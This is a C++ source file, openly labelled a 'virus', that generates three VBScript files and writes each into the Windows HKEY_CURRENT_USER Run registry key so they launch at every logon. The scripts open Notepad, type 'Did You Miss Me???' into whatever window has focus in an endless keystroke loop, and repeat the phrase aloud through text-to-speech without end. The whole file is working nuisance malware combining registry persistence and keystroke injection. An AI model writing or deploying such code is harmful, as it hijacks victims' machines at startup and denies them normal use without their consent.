/********************************************************************************************************
*************************Copyright © 2021 CatPaw Project. All rights reserved.***************************
**                                                                                                     **
**   Project     : [Did You Miss Me??]                                                                 **
**   File        : [main.cpp]                                                                          **
**   Description :                                                                                     **
**      [functionality: Creating Vbs files which will Open NotePad, Read and write Did You Miss Me?,   **
**                      and Will Set them on Start Up]                                                 **
**                                                                                                     **
**   Created On  : 26 December 2020 6:09 PM                                                            **
**   Created By  : [Khair Ruenso(Khair Bakhsh)] <mailto:[ruenso@hotmail.com]>                          **
**                                                                                                     **
**      !!!!!!Note!!!!!!      THE VIRUS WILL TAKE EFFECT AFTER REBOOT      !!!!!!Note!!!!!!            **
*********************************************************************************************************
*********************************************************************************************************/



                    // Including Headers/ Libaries
#include <iostream>            //Include Input and Output Stream
#include <string>              //Include Strings
#include <windows.h>           //Include Windows Library and windows functionality
#include <fstream>             // Include File Stream, Input and Output Both
                    // Namespace std, standard
using namespace std;
                    //Creating a class called PrototypeA, Holds all the Methods/Functions Of DYMM
class PrototypeA{
    public:
                    //Creating a function called didYouMissMeWrite which will write Did you miss me??
        string didYouMissMeWrite(string dirloc){
                    //Creating a string called VbsWrite will hold the the code of vbs for writing Did You Miss Me???
            string VbsWrite;
                    //Assigning Values to Vbswrite
            VbsWrite += "Set wshShell = wscript.CreateObject(\"WScript.Shell\")\n";            //setting WshShell to a Windows script Shell
            VbsWrite += "do\n";            //Creatin a do loop
            VbsWrite += "wshShell.sendKeys \"Did You Miss Me??? Did You Miss Me??? Did You Miss Me??? \"\n";            //Sending Keys from wshShell
            VbsWrite += "loop\n";            //end of do loop
                    //Outputting the code of VbsWrite in a .vbs file in the current directory
            ofstream writeFi("DidYouMissMeWrite.vbs");
            writeFi << VbsWrite;
            writeFi.close();            //closing the file
                    //getting the DidYouMissMeWrite.vbs location in the current directory and returning it
            string write = dirloc + "\\DidYouMissMeWrite.vbs";
            return write;
        }
                    //Creating a function called didYouMissMeRead which will read did you miss me??
        string didYouMissMeRead( string dirloc){
                    //Creating a string called VbsRead will hold the the code of vbs for reading Did You Miss Me???
            string VbsRead;
                    //Assigning Values to VbsRead
            VbsRead += "Dim text, speech\n";            //create two variables text, speech
            VbsRead += "Set speech = CreateObject(\"SAPI.SpVoice\")\n";            //setting speech in to Speak object
            VbsRead += "text = \"Did You Miss Me, Did You Miss Me, Did You Miss Me, Did You Miss Me, Did You Miss Me, \"\n";            //assigning text Did you Miss Me
            VbsRead += "do\n";            //Creating a do loop
            VbsRead += "speech.Speak text\n";            //calling speak from speech and setting it to text
            VbsRead += "loop\n";            //end of do loop
                    //Outputting the code of VbsRead in a .vbs file in the current directory
            ofstream readFi("DidYouMissMeRead.vbs");
            readFi << VbsRead;
            readFi.close();            //closing the file
                    //getting the DidYouMissMeRead.vbs location in the current directory and returning it
            string read = dirloc + "\\DidYouMissMeRead.vbs";
            return read;
        }
                    //Creating a function called didYouMissMeNotePad which will open Notepad
        string didYouMissMeNotePad(string dirloc){
                    //Creating a string called Notepad will hold the the code of vbs for Opening NotePad
            string Notepad;
                    //Assigning Values to Notepad
            Notepad += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";            //setting WshShell to a Windows script Shell
            Notepad += "Call WshShell.Run(\"%windir%\\system32\\notepad.exe\")\n";            //Running NotePad
                    //Outputting the code of Notepad in a .vbs file in the current directory
            ofstream NoteFi("OpenNotePad.vbs");
            NoteFi << Notepad;
            NoteFi.close();            //closing the file
                    //getting the OpenNotePad.vbs location in the current directory and returning it
            string Note = dirloc + "\\OpenNotePad.vbs";
            return Note;
        }
                    //Creating a function called startUp which will set our 3 functions of the virus on Start Up
        void startUp(string location){
                    //Creating a string called programPath which is assigned to the parameter called location
            string programPath = location;
                    //Creating a HKEY called hkey setting that to NULL
            HKEY hkey = NULL;
                    //Creating a LONG called createStat which will set our location in Regedit
            LONG createStat = RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
                    //Creating a Long called stat which will set our .vbs files on Start Up run
            LONG stat = RegSetValueEx(hkey, programPath.c_str(), 0, REG_SZ, (BYTE *)programPath.c_str(),
                                        (programPath.size()+1) * sizeof(wchar_t));
        }
};
int main(int argc, char* argv[])
{
                    //Getting the location of the running application
    char FileLocation[100] = {0};
    const char* loc = argv[0];
    memcpy(FileLocation, loc, strlen(loc));
                    //Removing Application name from the location
    string dir = FileLocation;
    string fdir = dir.substr(0, dir.find_last_of("\\/"));
                    //Calling Functions from calls
    PrototypeA call;
                    //Calling Statup assigning it's parameter to function didYouMissMeWrite and assigning didYouMissMeWrite parameter to fdir
    call.startUp(call.didYouMissMeWrite(fdir));
                        //Calling Statup assigning it's parameter to function didYouMissMeRead and assigning didYouMissMeWrite parameter to fdir
    call.startUp(call.didYouMissMeRead(fdir));
                        //Calling Statup assigning it's parameter to function didYouMissMeNotePad and assigning didYouMissMeWrite parameter to fdir
    call.startUp(call.didYouMissMeNotePad(fdir));
    return 0;
}
